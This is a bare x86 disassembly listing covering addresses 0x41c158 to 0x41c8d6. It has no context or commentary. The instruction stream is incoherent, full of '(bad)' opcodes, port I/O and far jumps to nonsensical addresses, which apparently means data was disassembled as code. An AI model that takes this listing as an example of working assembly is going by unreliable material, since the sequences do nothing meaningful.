  41c158:	and    ebp,DWORD PTR [eax+0x56edbff6]
  41c15e:	fdivrp st(6),st
  41c160:	jno    0x41c129
  41c162:	sub    eax,0x985ae958
  41c167:	and    edi,esp
  41c169:	xchg   edx,eax
  41c16a:	pop    esi
  41c16b:	sbb    al,0x39
  41c16d:	or     al,BYTE PTR [eax+0x6b491be7]
  41c173:	mov    cl,0xf0
  41c175:	sub    dh,BYTE PTR [edx-0x42]
  41c178:	jp     0x41c179
  41c17a:	retf   
  41c17b:	mov    esp,0xeea2ec1b
  41c180:	int3   
  41c181:	and    ecx,DWORD PTR ds:0xd80697ac
  41c187:	ret    
  41c188:	adc    DWORD PTR [eax+edx*4+0x38],eax
  41c18c:	cwde   
  41c18d:	ret    0x2ca4
  41c190:	add    BYTE PTR [edx+0x1a7e9f7],0xf3
  41c197:	mov    al,ds:0x378025ee
  41c19c:	in     eax,dx
  41c19d:	jge    0x41c191
  41c19f:	or     eax,0xa4f4e8ea
  41c1a4:	aas    
  41c1a5:	sub    DWORD PTR [esi],ebp
  41c1a7:	repz push 0xfffffffb
  41c1aa:	test   al,0xc
  41c1ac:	push   edi
  41c1ad:	jl     0x41c1c4
  41c1af:	inc    edx
  41c1b0:	lods   al,BYTE PTR ds:[esi]
  41c1b1:	mov    WORD PTR [edi+edi*1+0x5c],cs
  41c1b5:	mov    ch,0x30
  41c1b7:	in     al,dx
  41c1b8:	retf   
  41c1b9:	mov    ecx,0xcac3983a
  41c1be:	pop    ecx
  41c1bf:	sahf   
  41c1c0:	dec    ah
  41c1c2:	imul   edi,DWORD PTR [edi+0x31],0xf54550f9
  41c1c9:	mov    al,0xd8
  41c1cb:	imul   DWORD PTR [esi+0x17a9f45d]
  41c1d1:	test   DWORD PTR [ebp-0x24e2fef4],ebp
  41c1d7:	inc    edx
  41c1d8:	lods   al,BYTE PTR ds:[esi]
  41c1d9:	clc    
  41c1da:	jns    0x41c1a0
  41c1dc:	fld    TBYTE PTR [edx-0x7b]
  41c1df:	adc    al,BYTE PTR [ecx]
  41c1e1:	xchg   eax,ecx
  41c1e3:	outs   dx,BYTE PTR ss:[esi]
  41c1e5:	jnp    0x41c194
  41c1e7:	add    BYTE PTR [ebp+0x21],bh
  41c1ea:	out    dx,al
  41c1eb:	lock addr16 (bad) 
  41c1ee:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41c1f0:	sub    eax,0x6bca2bd0
  41c1f5:	fwait
  41c1f6:	inc    esp
  41c1f7:	add    ch,ch
  41c1f9:	mov    DWORD PTR [esi],ebp
  41c1fb:	fisttp DWORD PTR [ecx-0x3d201816]
  41c201:	inc    edi
  41c202:	mov    ds:0x1c7ba00d,eax
  41c207:	dec    eax
  41c208:	inc    edx
  41c209:	arpl   WORD PTR [ebx+0x74],bp
  41c20c:	outs   dx,BYTE PTR ds:[esi]
  41c20d:	or     eax,0x4b258b0f
  41c212:	dec    ebx
  41c213:	ins    DWORD PTR es:[edi],dx
  41c214:	retf   0xd3ac
  41c217:	mov    DWORD PTR [ecx-0x3ff6090d],esp
  41c21d:	cmc    
  41c21e:	jnp    0x41c23d
  41c220:	les    ecx,FWORD PTR [ebx]
  41c222:	in     al,dx
  41c223:	sub    al,0x9
  41c225:	ret    
  41c226:	clc    
  41c227:	test   DWORD PTR [ebx+0x14226c8d],0x95624c56
  41c231:	sahf   
  41c232:	les    ebp,FWORD PTR ds:0x9bff004d
  41c238:	mov    al,ds:0xdb949a98
  41c23d:	in     al,dx
  41c23e:	shl    BYTE PTR [edi],1
  41c240:	xchg   ebx,eax
  41c241:	push   ebp
  41c242:	add    eax,0xc580c791
  41c247:	jge    0x41c221
  41c249:	jmp    0x41c1cd
  41c24b:	je     0x41c2c9
  41c24d:	add    al,0xfe
  41c24f:	cmp    ebp,ebx
  41c251:	es xchg edx,eax
  41c253:	nop
  41c254:	ja     0x41c262
  41c256:	jbe    0x41c254
  41c258:	fisttp WORD PTR [eax+eax*4]
  41c25b:	pop    esi
  41c25d:	in     eax,dx
  41c25e:	fisttp QWORD PTR [eax-0x2b61b577]
  41c264:	outs   dx,DWORD PTR ds:[esi]
  41c265:	xchg   BYTE PTR [ebx-0x539d2904],ch
  41c26b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c26c:	pop    esp
  41c26d:	inc    ebp
  41c26e:	loop   0x41c2ab
  41c270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c271:	js     0x41c287
  41c273:	mov    cl,0x2f
  41c275:	mov    ebp,0x9f59bab5
  41c27a:	cmp    bh,BYTE PTR [ebp-0x4243c9b3]
  41c280:	push   cs
  41c281:	inc    esp
  41c282:	push   esp
  41c283:	outs   dx,DWORD PTR ds:[esi]
  41c284:	cmp    esp,esi
  41c286:	and    ch,BYTE PTR [edi]
  41c288:	adc    DWORD PTR [edi-0x4b2a1991],ecx
  41c28e:	pop    ebp
  41c28f:	pop    ss
  41c290:	push   esp
  41c291:	sbb    bh,BYTE PTR [edx+eax*1]
  41c294:	add    al,0x57
  41c296:	fdivr  DWORD PTR [esi+0x7990451f]
  41c29c:	pusha  
  41c29d:	fild   DWORD PTR [esi]
  41c29f:	loop   0x41c31e
  41c2a1:	fstp   TBYTE PTR [ebp+0x71]
  41c2a4:	test   eax,0xbd17f121
  41c2a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2aa:	lahf   
  41c2ab:	pop    ecx
  41c2ac:	fldcw  WORD PTR [ecx+0x3032872d]
  41c2b2:	arpl   WORD PTR [eax],cx
  41c2b4:	pop    esp
  41c2b5:	arpl   WORD PTR [ecx-0x12],bp
  41c2b8:	mov    dh,0xd7
  41c2ba:	leave  
  41c2bb:	push   esp
  41c2bc:	dec    ebp
  41c2bd:	mov    esi,0x8cf5e184
  41c2c2:	mov    esp,0xddda86cd
  41c2c7:	lea    eax,[edx]
  41c2c9:	cwde   
  41c2ca:	sbb    eax,0x3490d6f6
  41c2cf:	outs   dx,BYTE PTR ds:[esi]
  41c2d0:	pop    ss
  41c2d1:	mov    ds:0x78ffba4b,eax
  41c2d6:	shl    BYTE PTR [edx-0x40],cl
  41c2d9:	mov    DWORD PTR [esi],eax
  41c2db:	xchg   ecx,eax
  41c2dc:	pop    ecx
  41c2dd:	jmp    0x9554463a
  41c2e2:	mov    al,0x8
  41c2e4:	inc    eax
  41c2e5:	shl    bl,cl
  41c2e7:	out    dx,eax
  41c2e8:	dec    edx
  41c2e9:	je     0x41c280
  41c2eb:	das    
  41c2ec:	mov    cl,0x9a
  41c2ee:	sub    DWORD PTR [ebp+0x1a5a5367],ebx
  41c2f4:	clc    
  41c2f5:	(bad)  
  41c2f6:	xlat   BYTE PTR ds:[ebx]
  41c2f7:	ficomp DWORD PTR [ebp+0x27b9cbf9]
  41c2fd:	mov    bl,0x2f
  41c2ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c300:	xchg   edi,eax
  41c301:	out    dx,eax
  41c302:	stos   DWORD PTR es:[edi],eax
  41c303:	jge    0x41c2ce
  41c305:	les    esi,FWORD PTR [edx+0x7baa109f]
  41c30b:	or     eax,0x5c403419
  41c310:	iret   
  41c311:	int    0x13
  41c313:	push   esi
  41c314:	scas   al,BYTE PTR es:[edi]
  41c315:	pop    edx
  41c316:	sbb    BYTE PTR [ecx],bh
  41c318:	lods   eax,DWORD PTR ds:[esi]
  41c319:	inc    edi
  41c31a:	push   edx
  41c31b:	in     al,0xd7
  41c31d:	int    0x5
  41c31f:	jecxz  0x41c31b
  41c321:	mov    bh,0x9b
  41c323:	loop   0x41c2ac
  41c325:	fldcw  WORD PTR [ebp+0x35]
  41c328:	dec    ecx
  41c329:	and    eax,0x6a51482
  41c32e:	leave  
  41c32f:	xor    DWORD PTR [ebp-0xe59239c],edx
  41c335:	push   esp
  41c336:	and    eax,0xe6cfba29
  41c33b:	xchg   DWORD PTR [eax+ebp*4-0x582bafb5],ebx
  41c342:	push   ds
  41c343:	jno    0x41c3c3
  41c345:	mov    bh,0x1
  41c347:	xlat   BYTE PTR ds:[ebx]
  41c348:	mov    ss,WORD PTR [eax]
  41c34a:	xchg   edi,eax
  41c34b:	mov    al,0x31
  41c34d:	adc    eax,0x9ca111da
  41c352:	jmp    0xc778:0x9e0088ed
  41c359:	jo     0x41c3a2
  41c35b:	mov    edx,0x5720bf55
  41c360:	push   eax
  41c361:	pop    ds
  41c362:	adc    esi,DWORD PTR [ebx-0x5ecc5b8f]
  41c368:	iret   
  41c369:	stos   DWORD PTR es:[edi],eax
  41c36a:	cmp    al,0xeb
  41c36c:	jbe    0x41c32a
  41c36e:	cmp    DWORD PTR [ecx-0x1feb1f2a],esi
  41c374:	push   eax
  41c375:	push   eax
  41c376:	pop    ds
  41c377:	enter  0x7062,0x70
  41c37b:	test   DWORD PTR [edx+0x43d8e4e3],ecx
  41c381:	jnp    0x41c39a
  41c383:	add    DWORD PTR [edi+0x7d5ee2aa],esi
  41c389:	js     0x41c39e
  41c38b:	inc    ecx
  41c38c:	cmp    DWORD PTR [ecx-0x4a],ebp
  41c38f:	mov    edx,0x7b20accf
  41c394:	pop    eax
  41c395:	nop
  41c396:	fld    QWORD PTR [ebx+0x232ba5bf]
  41c39c:	out    0xf,eax
  41c39e:	mov    ebx,0xd65aac05
  41c3a3:	imul   eax,DWORD PTR [eax],0xdd9238fb
  41c3a9:	push   eax
  41c3aa:	aas    
  41c3ab:	pop    ss
  41c3ac:	leave  
  41c3ad:	mov    ah,0x54
  41c3af:	out    dx,al
  41c3b0:	sbb    esi,esi
  41c3b2:	cli    
  41c3b3:	sbb    ch,0x34
  41c3b6:	es (bad) 
  41c3b8:	or     BYTE PTR [edi+esi*8+0x7e],cl
  41c3bc:	mov    al,ds:0xf9669112
  41c3c1:	sbb    BYTE PTR [esi+0x26d28bff],al
  41c3c7:	stos   BYTE PTR es:[edi],al
  41c3c8:	les    ecx,FWORD PTR [ebx]
  41c3ca:	jp     0x41c35c
  41c3cc:	and    al,0xb3
  41c3ce:	rcr    BYTE PTR cs:[edx+0x17],cl
  41c3d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3d3:	or     ebp,esi
  41c3d5:	scas   al,BYTE PTR es:[edi]
  41c3d6:	mov    ah,0x99
  41c3d8:	and    DWORD PTR [edx*1+0x77f833a6],0x90d94402
  41c3e3:	cmp    ah,0xb7
  41c3e6:	es jl  0x41c375
  41c3e9:	stos   BYTE PTR es:[edi],al
  41c3ea:	add    al,dh
  41c3ec:	mul    DWORD PTR [ecx+0x797958f4]
  41c3f2:	in     eax,0x11
  41c3f4:	jmp    0x41c39d
  41c3f6:	and    eax,ebx
  41c3f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3f9:	xlat   BYTE PTR ds:[ebx]
  41c3fa:	es jo  0x41c3e1
  41c3fd:	ds mov al,0x82
  41c400:	hlt    
  41c401:	call   0x1dbb42c5
  41c406:	jnp    0x41c444
  41c408:	mov    ecx,0x779678a1
  41c40d:	mov    edx,0xa9f477a6
  41c412:	in     eax,dx
  41c413:	mov    al,ds:0xce91aaa1
  41c418:	shl    BYTE PTR [edx],cl
  41c41a:	sar    bh,cl
  41c41c:	mov    edi,0xd39f53d6
  41c421:	adc    esp,ecx
  41c423:	cmp    BYTE PTR [edx],ah
  41c425:	sbb    dh,BYTE PTR [ebp+0xf99f914]
  41c42b:	and    esi,DWORD PTR [ecx+eax*4+0x31]
  41c42f:	es pop edx
  41c431:	sbb    al,0x75
  41c433:	jb     0x41c4ae
  41c435:	popa   
  41c436:	ror    DWORD PTR [ecx],cl
  41c438:	fidivr DWORD PTR [esi+0x67f5e7f4]
  41c43e:	xor    ebx,edx
  41c440:	outs   dx,DWORD PTR ds:[esi]
  41c441:	fidivr DWORD PTR [eax]
  41c443:	inc    esp
  41c444:	xor    ah,BYTE PTR [edx-0x77]
  41c447:	mov    eax,ds:0x3b52ecde
  41c44c:	sbb    ebp,DWORD PTR [ebx+ecx*8]
  41c44f:	push   cs
  41c450:	or     al,0x82
  41c452:	adc    eax,0x65cdabe5
  41c457:	aad    0x45
  41c459:	in     eax,0x74
  41c45b:	loopne 0x41c4a2
  41c45d:	fsub   st(3),st
  41c45f:	js     0x41c4b6
  41c461:	jno    0x41c4d1
  41c463:	push   ebp
  41c464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c465:	mov    bh,0xac
  41c467:	stos   BYTE PTR es:[edi],al
  41c468:	add    bh,BYTE PTR [edi+0x44]
  41c46b:	repz jge 0x41c3fc
  41c46e:	xor    ebx,DWORD PTR [edi+0xe7e6b80]
  41c474:	scas   al,BYTE PTR es:[edi]
  41c475:	(bad)  
  41c476:	data16 into 
  41c478:	mov    ebx,DWORD PTR [edx]
  41c47a:	jo     0x41c48b
  41c47c:	adc    eax,0xae034bb3
  41c481:	mov    dl,0xbf
  41c483:	shr    BYTE PTR [eax],cl
  41c485:	mov    bl,0x9e
  41c487:	fcomp  QWORD PTR [esi]
  41c489:	sar    BYTE PTR [ebx],cl
  41c48b:	push   cs
  41c48c:	pop    edx
  41c48d:	daa    
  41c48e:	add    BYTE PTR [edi+0x7a],al
  41c491:	inc    ebx
  41c492:	and    DWORD PTR [edi],esi
  41c494:	mov    eax,ds:0xd0c4c0af
  41c499:	ret    
  41c49a:	dec    esp
  41c49b:	and    ch,cl
  41c49d:	dec    esi
  41c49e:	pushf  
  41c49f:	pop    esp
  41c4a0:	push   esi
  41c4a1:	xor    dl,BYTE PTR [edx]
  41c4a3:	push   cx
  41c4a6:	cmp    DWORD PTR [esi],0x67
  41c4a9:	dec    edi
  41c4aa:	lds    ebp,FWORD PTR [ecx]
  41c4ac:	adc    eax,0x3e8bfa4a
  41c4b1:	nop
  41c4b2:	sub    ah,BYTE PTR [ebp-0x4]
  41c4b5:	outs   dx,BYTE PTR ds:[esi]
  41c4b6:	pop    edi
  41c4b7:	push   0x18
  41c4b9:	jl     0x41c4f1
  41c4bb:	xor    eax,0x155b6960
  41c4c0:	adc    DWORD PTR [eax+0x1900c6f3],edi
  41c4c6:	adc    ebp,eax
  41c4c8:	mov    al,0x13
  41c4ca:	cmp    eax,0x4cb4a91f
  41c4cf:	test   ah,ah
  41c4d1:	(bad)  
  41c4d2:	mov    ebp,0x24f1df85
  41c4d7:	out    dx,eax
  41c4d8:	or     dl,BYTE PTR [edx+ebx*1-0x46a88660]
  41c4df:	rcr    BYTE PTR [ebx],0x94
  41c4e2:	(bad)  
  41c4e4:	add    BYTE PTR [esi-0x1fb89651],dl
  41c4ea:	sub    DWORD PTR [edx],edi
  41c4ec:	jle    0x41c4d4
  41c4ee:	daa    
  41c4ef:	(bad)  
  41c4f0:	and    eax,0xee49ced7
  41c4f5:	sub    al,0x6c
  41c4f7:	jg     0x41c489
  41c4f9:	mov    dh,0xe7
  41c4fb:	(bad)  
  41c4fc:	shl    DWORD PTR [esi],1
  41c4fe:	sbb    ch,BYTE PTR [edi+ecx*8+0x64]
  41c502:	clc    
  41c503:	pushf  
  41c504:	cwde   
  41c505:	and    DWORD PTR [edx+0x14],ebx
  41c508:	mov    ebp,DWORD PTR [ebp+0x3b]
  41c50b:	fnstcw WORD PTR [edi]
  41c50d:	push   cs
  41c50e:	mov    dh,0xea
  41c510:	sbb    eax,0x6c83d456
  41c515:	aas    
  41c516:	mov    es,WORD PTR [esi+0x45]
  41c519:	mov    cl,0xd5
  41c51b:	inc    edx
  41c51c:	sub    eax,0x3cb03aa
  41c521:	aam    0x4f
  41c523:	adc    eax,0x7873ec59
  41c528:	int    0x1a
  41c52a:	out    0xc2,al
  41c52c:	jno    0x41c53f
  41c52e:	push   0x7
  41c530:	push   es
  41c531:	mov    WORD PTR [edx-0x25f868e2],ss
  41c537:	dec    edx
  41c538:	int3   
  41c539:	xchg   edi,eax
  41c53a:	or     ecx,DWORD PTR [edx-0x7a]
  41c53d:	xor    al,0x2d
  41c53f:	ror    DWORD PTR [edx-0x15582d0e],0x4a
  41c546:	cmp    ch,BYTE PTR [edi+0x24]
  41c549:	jo     0x41c577
  41c54b:	inc    DWORD PTR [edx]
  41c54d:	xchg   esp,eax
  41c54e:	aaa    
  41c54f:	arpl   di,ax
  41c551:	ficomp DWORD PTR [eax]
  41c553:	pop    es
  41c554:	push   ecx
  41c555:	inc    esi
  41c556:	inc    edx
  41c557:	scas   al,BYTE PTR es:[edi]
  41c558:	enter  0xaf55,0x6a
  41c55c:	push   ss
  41c55d:	enter  0xd162,0x71
  41c561:	jno    0x41c536
  41c563:	sti    
  41c564:	ja     0x41c57c
  41c566:	jae    0x41c56f
  41c568:	sbb    DWORD PTR [esi],esi
  41c56a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c56b:	mov    ebp,DWORD PTR [eax]
  41c56d:	push   ebp
  41c56e:	shl    DWORD PTR [edx+0x3],1
  41c571:	sar    DWORD PTR [ecx-0x4ba03cef],cl
  41c577:	leave  
  41c578:	sub    esp,DWORD PTR [ebx]
  41c57a:	add    al,0xce
  41c57c:	sub    eax,0x5889efff
  41c581:	fs aam 0xce
  41c584:	or     BYTE PTR [ebp+esi*1-0x3e],dh
  41c588:	imul   edx,DWORD PTR [edx-0x23],0xffffffc6
  41c58c:	ins    DWORD PTR es:[edi],dx
  41c58d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c58e:	push   0x49a44026
  41c593:	outs   dx,BYTE PTR ds:[esi]
  41c594:	sbb    eax,0x3d288580
  41c599:	test   ch,0xab
  41c59c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41c59e:	and    dh,bh
  41c5a0:	adc    BYTE PTR [ecx+0x37b0641d],dh
  41c5a6:	pop    esp
  41c5a7:	mov    ecx,DWORD PTR [edx]
  41c5a9:	inc    eax
  41c5aa:	mov    dl,0xc9
  41c5ac:	popa   
  41c5ad:	ins    DWORD PTR es:[edi],dx
  41c5ae:	call   0x3237:0xfe200c9d
  41c5b5:	mov    eax,ds:0xfa8cf6bd
  41c5ba:	push   0xffffffe7
  41c5bc:	jge    0x41c5ef
  41c5be:	cmp    al,0xfc
  41c5c0:	call   0x2ccbbff6
  41c5c5:	or     eax,0x7be9f657
  41c5ca:	push   0xa
  41c5cc:	ror    BYTE PTR ds:[edx-0x3c],0x35
  41c5d1:	xchg   esi,eax
  41c5d2:	add    BYTE PTR [edx],dh
  41c5d4:	hlt    
  41c5d5:	xchg   cl,dl
  41c5d7:	ja     0x41c612
  41c5d9:	jmp    edi
  41c5db:	and    ecx,0x6bf74613
  41c5e1:	dec    esi
  41c5e2:	imul   eax,DWORD PTR [edx-0x6b],0xffffffe9
  41c5e6:	mov    ds:0xdbd38b10,eax
  41c5eb:	sub    DWORD PTR [ebp+0x263113de],0x1d86458e
  41c5f5:	jae    0x41c5f8
  41c5f7:	jecxz  0x41c655
  41c5f9:	outs   dx,BYTE PTR ds:[esi]
  41c5fa:	or     eax,DWORD PTR [edi]
  41c5fc:	aas    
  41c5fd:	jle    0x41c638
  41c5ff:	arpl   di,bx
  41c601:	out    0x39,eax
  41c603:	xchg   edi,eax
  41c604:	cmp    eax,0xba60425f
  41c609:	or     DWORD PTR [eax],eax
  41c60b:	mov    cl,0xe4
  41c60d:	lahf   
  41c60e:	mov    ds:0x2523cb18,eax
  41c613:	fidiv  DWORD PTR ds:0xca083738
  41c619:	jp     0x41c5d1
  41c61b:	cmp    BYTE PTR [esp+esi*4+0x1d],0x83
  41c620:	jge    0x41c635
  41c622:	jp     0x41c665
  41c624:	push   bp
  41c626:	test   DWORD PTR [edx-0x63320001],esi
  41c62c:	adc    BYTE PTR [esi],ah
  41c62e:	pop    edi
  41c62f:	xor    dh,dl
  41c631:	xchg   ecx,eax
  41c632:	test   eax,0x8fcf22d4
  41c637:	or     eax,0xdeaa63cf
  41c63c:	imul   ebp,DWORD PTR [esi-0x80],0xc78e95d7
  41c643:	mov    ds:0xfcb5be1d,al
  41c648:	adc    BYTE PTR [ebx-0x45],ah
  41c64b:	inc    edx
  41c64c:	nop
  41c64d:	fsubr  st(3),st
  41c64f:	mov    bh,0x66
  41c651:	xchg   ecx,eax
  41c652:	mov    bh,0x1d
  41c654:	adc    BYTE PTR [eax+ebx*1-0x2bc2fcb3],0x46
  41c65c:	es mov bh,0x2
  41c65f:	xor    eax,0xca19bbbb
  41c664:	setl   BYTE PTR [edi]
  41c667:	mov    dh,0xe1
  41c669:	or     ecx,DWORD PTR [ecx+0x777fc310]
  41c66f:	fnstcw WORD PTR [eax-0x28265a9f]
  41c675:	jno    0x41c628
  41c677:	ret    0x9d49
  41c67a:	enter  0xe65c,0x7f
  41c67e:	mov    bh,0x81
  41c680:	jp     0x41c669
  41c682:	mov    ?,WORD PTR [edx+ebx*8]
  41c685:	bswap  esi
  41c687:	add    DWORD PTR [eax],edx
  41c689:	daa    
  41c68a:	repz and edx,DWORD PTR [edi]
  41c68d:	mov    eax,ds:0x46d1d87d
  41c692:	mov    ah,0x2f
  41c694:	dec    esp
  41c695:	add    DWORD PTR [esi],ebx
  41c697:	inc    esi
  41c698:	lahf   
  41c699:	test   DWORD PTR [eax+0x14f72d32],0x9bf9554
  41c6a3:	xor    esp,DWORD PTR [ecx-0x20]
  41c6a6:	out    dx,al
  41c6a7:	sub    eax,0xeaa69560
  41c6ac:	(bad)  
  41c6ad:	xor    eax,0xefdee453
  41c6b2:	inc    ebx
  41c6b3:	call   0x1b1a:0x5f4f870
  41c6ba:	bnd jns 0x41c6a1
  41c6bd:	jmp    0xf73a:0xc0639152
  41c6c4:	ror    eax,0x67
  41c6c7:	pop    esp
  41c6c8:	mov    dh,0x2e
  41c6ca:	xchg   ebp,eax
  41c6cb:	in     al,dx
  41c6cc:	xchg   DWORD PTR ds:0xb57d9e8f,edx
  41c6d2:	and    BYTE PTR [edx],0x9d
  41c6d5:	inc    ebp
  41c6d6:	and    DWORD PTR [ebp+eiz*8-0x4],0x4cdedc1d
  41c6de:	call   0x5397:0xcb231c16
  41c6e5:	dec    ebp
  41c6e6:	mov    edx,0x6bf0c65c
  41c6eb:	jmp    0x41c6a9
  41c6ed:	loopne 0x41c706
  41c6ef:	(bad)  
  41c6f1:	mul    BYTE PTR [ebx+edi*8]
  41c6f4:	and    al,0xd8
  41c6f6:	xlat   BYTE PTR ds:[ebx]
  41c6f7:	(bad)  
  41c6f8:	arpl   WORD PTR [ebp-0xed6fea1],bp
  41c6fe:	xor    eax,0xc50e97bb
  41c703:	test   eax,0x9badb80d
  41c708:	pop    ebx
  41c709:	and    dl,0x22
  41c70c:	int3   
  41c70d:	pop    ebx
  41c70e:	jg     0x41c6b2
  41c710:	imul   edi,edi,0xbe23962b
  41c716:	push   ebx
  41c717:	jg     0xcb269d3a
  41c71d:	mov    bh,0x10
  41c71f:	dec    edx
  41c720:	fld    DWORD PTR [eax]
  41c722:	adc    DWORD PTR [edi-0x42],ecx
  41c725:	imul   ecx,DWORD PTR [edx],0x2f33fff5
  41c72b:	sub    al,0xb1
  41c72d:	xor    ch,cl
  41c72f:	call   0xd241ab62
  41c734:	cs mov ebp,0xd9d81399
  41c73a:	in     al,0x24
  41c73c:	xchg   ebx,eax
  41c73d:	jg     0x41c713
  41c73f:	dec    ecx
  41c740:	das    
  41c741:	imul   esi,DWORD PTR [ebp+0x27],0xe0528f29
  41c748:	xor    dh,cl
  41c74a:	sub    bl,ch
  41c74c:	pop    esp
  41c74d:	sbb    BYTE PTR [ebx],ch
  41c74f:	jae    0x41c7a4
  41c751:	es retf 
  41c753:	addr16 and al,0x8f
  41c756:	mov    esi,0x1ae23365
  41c75b:	lods   eax,DWORD PTR ds:[esi]
  41c75c:	pop    ebp
  41c75d:	stos   DWORD PTR es:[edi],eax
  41c75e:	into   
  41c75f:	xor    DWORD PTR [ecx],edi
  41c761:	leave  
  41c762:	fmul   st(3),st
  41c764:	nop
  41c765:	adc    DWORD PTR [edi+0x70],esp
  41c768:	hlt    
  41c769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c76a:	daa    
  41c76b:	out    0x65,al
  41c76d:	inc    esp
  41c76e:	dec    eax
  41c76f:	cmp    DWORD PTR ds:0x7eaca15b,eax
  41c775:	pop    esp
  41c776:	jp     0x41c78e
  41c778:	sbb    DWORD PTR [ebx],ebx
  41c77a:	cmp    esi,edi
  41c77c:	ror    BYTE PTR [eax],0x10
  41c77f:	pop    edi
  41c780:	jecxz  0x41c76c
  41c782:	aaa    
  41c783:	cli    
  41c784:	loop   0x41c7ad
  41c786:	sti    
  41c787:	retf   0xb40f
  41c78a:	mov    edi,0x21e76ba9
  41c78f:	sub    al,0xf0
  41c791:	sub    esi,DWORD PTR [esp+eax*1+0x78bd7516]
  41c798:	adc    BYTE PTR [edi],dh
  41c79a:	popf   
  41c79b:	pop    es
  41c79c:	mov    ds:0x4c1120cf,eax
  41c7a1:	cmp    al,0xd3
  41c7a3:	inc    esi
  41c7a4:	mov    ds:0x748875fa,al
  41c7a9:	popa   
  41c7aa:	fist   WORD PTR [esi-0xa08e75e]
  41c7b0:	sbb    ebx,edi
  41c7b2:	lea    ecx,[ecx+0x6cdd2da5]
  41c7b8:	sar    DWORD PTR [edi-0xa2b10cf],cl
  41c7be:	mov    ch,BYTE PTR [ecx+0x3f82f7b0]
  41c7c4:	mov    dl,0x98
  41c7c6:	inc    edi
  41c7c7:	hlt    
  41c7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7c9:	xor    BYTE PTR [bx+si-0x7e],ch
  41c7cd:	mov    ch,0xb1
  41c7cf:	adc    eax,0x9bed8f1a
  41c7d4:	lock rcl cl,cl
  41c7d7:	mov    cl,0xb4
  41c7d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7da:	inc    ebx
  41c7db:	jbe    0x41c775
  41c7dd:	cmp    dl,ch
  41c7df:	add    eax,0x54ae3fdf
  41c7e4:	mov    ds:0xb1a479a3,al
  41c7e9:	ins    BYTE PTR es:[edi],dx
  41c7ea:	cmp    cl,BYTE PTR [eax+0x5acfd844]
  41c7f0:	mov    ah,0x3d
  41c7f2:	jle    0x41c869
  41c7f4:	pop    ecx
  41c7f5:	and    al,0x29
  41c7f7:	rcl    dl,1
  41c7f9:	daa    
  41c7fa:	(bad)  
  41c7fb:	cmp    esp,DWORD PTR [ecx-0x1f]
  41c7fe:	and    eax,0xa4708738
  41c803:	test   al,0x5f
  41c805:	cli    
  41c806:	int    0xc3
  41c808:	and    bl,al
  41c80a:	inc    eax
  41c80b:	retf   0x417b
  41c80e:	cmp    al,0x49
  41c810:	daa    
  41c811:	retf   
  41c812:	jge    0x41c7e6
  41c814:	icebp  
  41c815:	cmp    al,0x4e
  41c818:	lea    edx,[eax]
  41c81a:	clc    
  41c81b:	js     0x41c7a6
  41c81d:	pop    ebp
  41c81e:	lahf   
  41c81f:	adc    BYTE PTR [esp+eiz*4-0x216549d6],bl
  41c826:	mov    WORD PTR [ecx+0x221bc40d],fs
  41c82c:	add    ebp,DWORD PTR [eax]
  41c82e:	pop    ss
  41c82f:	push   esp
  41c830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c831:	ja     0x41c819
  41c833:	fnstsw WORD PTR [eax-0x7d]
  41c836:	xlat   BYTE PTR ds:[ebx]
  41c837:	jo     0x41c832
  41c839:	xchg   ebp,eax
  41c83a:	mov    ch,0x7e
  41c83c:	dec    esi
  41c83d:	jl     0x41c7e2
  41c83f:	mov    eax,ds:0x9f122c2c
  41c844:	dec    edi
  41c845:	test   al,0xc7
  41c847:	xchg   ebx,eax
  41c848:	cmc    
  41c849:	hlt    
  41c84a:	(bad)  
  41c84b:	xchg   ecx,eax
  41c84c:	dec    edx
  41c84d:	out    0x3a,eax
  41c84f:	sub    ch,0x70
  41c852:	out    0xda,eax
  41c854:	mov    al,0x6a
  41c856:	adc    BYTE PTR [esi],bl
  41c858:	dec    ebx
  41c859:	leave  
  41c85a:	xor    DWORD PTR [edi-0xd1314e6],edx
  41c860:	shr    BYTE PTR [ebp-0x2bccb652],cl
  41c866:	in     al,dx
  41c867:	daa    
  41c868:	shr    BYTE PTR [eax+ebp*4+0x5e],0xd7
  41c86d:	cs xchg ebx,eax
  41c86f:	ins    DWORD PTR es:[edi],dx
  41c870:	cdq    
  41c871:	pusha  
  41c872:	cmp    eax,esi
  41c874:	mov    ebp,0xe19a752f
  41c879:	lods   al,BYTE PTR ds:[esi]
  41c87a:	dec    edi
  41c87b:	shr    DWORD PTR [edx-0x43],1
  41c87e:	push   eax
  41c87f:	mov    al,ds:0x76b43eb6
  41c884:	sub    DWORD PTR [ebx-0x25],0xfffffff6
  41c888:	(bad)  
  41c889:	mov    esi,0xebb20edb
  41c88e:	push   ecx
  41c88f:	call   0xac00c5a7
  41c894:	shr    DWORD PTR [eax+0x48ef47b0],0x81
  41c89b:	pop    ebx
  41c89c:	test   al,0xff
  41c89e:	adc    al,0x90
  41c8a0:	sbb    DWORD PTR [esi],esp
  41c8a2:	or     bl,BYTE PTR [esi+0x76f52451]
  41c8a8:	cdq    
  41c8a9:	push   0x59d3cfba
  41c8ae:	addr16 jge 0x41c90d
  41c8b1:	add    al,0x8b
  41c8b3:	lock inc esp
  41c8b5:	jae    0x41c851
  41c8b7:	dec    esi
  41c8b9:	inc    DWORD PTR [esi-0x52]
  41c8bc:	icebp  
  41c8bd:	shl    ebp,0xc1
  41c8c0:	mov    ah,0x5d
  41c8c2:	lds    edi,FWORD PTR [esi-0x21660184]
  41c8c8:	pop    esp
  41c8c9:	icebp  
  41c8ca:	cmp    edx,DWORD PTR [eax-0x370a7adf]
  41c8d0:	aaa    
  41c8d1:	test   eax,0xff6d94d1
  41c8d6:	push   ebx
